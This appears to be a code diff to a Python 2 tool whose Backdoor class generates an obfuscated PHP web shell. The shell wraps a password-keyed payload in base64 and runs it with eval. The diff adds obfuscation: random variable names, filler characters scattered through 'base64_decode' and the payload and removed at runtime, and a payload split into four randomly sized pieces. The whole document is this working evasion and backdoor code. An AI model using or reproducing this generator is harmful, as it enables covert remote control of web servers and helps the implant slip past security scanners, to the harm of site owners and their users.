@@ -16,8 +16,8 @@
 # program. If not, go to http://www.gnu.org/licenses/gpl.html
 # or write to the Free Software Foundation, Inc.,
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
-import base64
-from random import random
+import base64, codecs
+from random import random, randrange, choice
 
 class Backdoor:
 	payload_template = """
@@ -33,66 +33,88 @@ echo '</%%%END_KEY%%%>';
 	backdoor_template = "<?php eval(base64_decode('%%%PAYLOAD%%%')); ?>"
 	
 	backdoor_template = """<?php 
-	$%%FUNC_VAR%% = "%%B64_ENCODED%%";
-	$%%FUNC_VAR%%1="%%PAYLOAD1%%";
-	$%%FUNC_VAR%%2="%%PAYLOAD2%%";
-	$%%FUNC_VAR%%3="%%PAYLOAD3%%";
-	
-	eval($%%FUNC_VAR%%(str_replace("%%FUNC_VAR%%",$%%FUNC_VAR%%1.$%%FUNC_VAR%%2.$%%FUNC_VAR%%3 , ""))); 
-	?>
-	"""
+$%%PAY_VAR%%1="%%PAYLOAD1%%";
+$%%PAY_VAR%%2="%%PAYLOAD2%%";
+$%%PAY_VAR%%3="%%PAYLOAD3%%";
+$%%PAY_VAR%%4="%%PAYLOAD4%%";
+$%%B64_FUNC%% = "%%B64_ENCODED%%";
+$%%REPL_FUNC%% = "str_replace";
+$%%B64_FUNC%% = $%%REPL_FUNC%%("%%B64_POLLUTION%%", "", $%%B64_FUNC%%);
+eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%PAY_VAR%%2.$%%PAY_VAR%%3.$%%PAY_VAR%%4))); 
+?>
+"""
 
 	def __init__( self, password ):
 		self.password  = password
 		self.start_key = self.password[:2]
 		self.end_key   = self.password[2:]
 		self.payload   = self.payload_template.replace( '%%%START_KEY%%%', self.start_key ).replace( '%%%END_KEY%%%', self.end_key ).replace( '\n', '' )
-		self.backdoor  = self.backdoor_template.replace( '%%%PAYLOAD%%%', base64.b64encode(self.payload) )
-
-#		print self.encode_template()
-#		import sys
-#		sys.exit()
+		self.backdoor  = self.encode_template()
 
 	def __str__( self ):
 		return self.backdoor
 
-	def encode_template(self):
+	def __random_string(self, len=4, fixed=False):
+		if not fixed:
+			len = randrange(2,len)
+		return ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(len)])
 		
-		b64_func_name = 'base64_decode'
-		
-		
-		not_random_chars = ''
-		for i in range(0, len(self.password)):
-			not_random_chars = self.password[:i]
-			if not not_random_chars in b64_func_name:
+	def __pollute_string(self, str, frequency=0.1):
+
+		pollution_chars = self.__random_string(16, True)
+
+		pollution = ''
+		for i in range(0, len(pollution_chars)):
+			pollution = pollution_chars[:i]
+			if (not pollution in str) :
 				break
 			
-		b64_func_name_encoded = ''
-		for char in b64_func_name:
-			if random() < 0.7:
-				b64_func_name_encoded += not_random_chars + char
+		if not pollution:
+			print "! Error generating pseudo random string, change password." 
+			return None, None
+			
+		str_encoded = ''
+		for char in str:
+			if random() < frequency:
+				str_encoded += pollution + char
 			else:
-				b64_func_name_encoded += char
+				str_encoded += char
 				
-				
-			
-		encoded_payload = base64.b64encode(self.payload)	
-		length  = len(encoded_payload)
-		third	= length / 3
-		thirds  = third * 2
+		return pollution, str_encoded
 		
-		template = self.backdoor_template.replace( '%%B64_ENCODED%%', b64_func_name_encoded )
-		template = template.replace( '%%FUNC_VAR%%', not_random_chars )
-		template = template.replace( '%%PAYLOAD1%%', encoded_payload[:third] )
-		template = template.replace( '%%PAYLOAD2%%', encoded_payload[third:thirds] )
-		template = template.replace( '%%PAYLOAD3%%', encoded_payload[thirds:] )
 		
-		print template
-			
-		
-				 
-		#php -r "\$i='base64_decode'; eval(\$i('cHJpbnQoJ2FzZCcpOw==')); print('aaaaaa' | 'b' );"
 
+	def encode_template(self):
+		
+		b64_new_func_name = self.__random_string()
+		b64_pollution, b64_polluted = self.__pollute_string('base64_decode',0.7)
+		
+		payload_var = self.__random_string()
+		payload_pollution, payload_polluted = self.__pollute_string(base64.b64encode(self.payload))
+		
+		replace_new_func_name = self.__random_string()
+		
+		length  = len(payload_polluted)
+		offset = 7
+		piece1	= length / 4 + randrange(-offset,+offset)
+		piece2  = length / 2 + randrange(-offset,+offset)
+		piece3  = length*3/4 + randrange(-offset,+offset)
+		
+		template = self.backdoor_template.replace( '%%B64_ENCODED%%', b64_polluted )
+		template = template.replace( '%%B64_FUNC%%', b64_new_func_name )
+		template = template.replace( '%%PAY_VAR%%', payload_var )
+		template = template.replace( '%%PAYLOAD_POLLUTION%%', payload_pollution )
+		template = template.replace( '%%B64_POLLUTION%%', b64_pollution )
+		template = template.replace( '%%PAYLOAD1%%', payload_polluted[:piece1] )
+		template = template.replace( '%%PAYLOAD2%%', payload_polluted[piece1:piece2] )
+		template = template.replace( '%%PAYLOAD3%%', payload_polluted[piece2:piece3] )
+		template = template.replace( '%%PAYLOAD4%%', payload_polluted[piece3:] )
+		
+		
+		template = template.replace( '%%REPL_FUNC%%', replace_new_func_name )
+		
+		return template
+			
 		
 
 	def save( self, filename ):
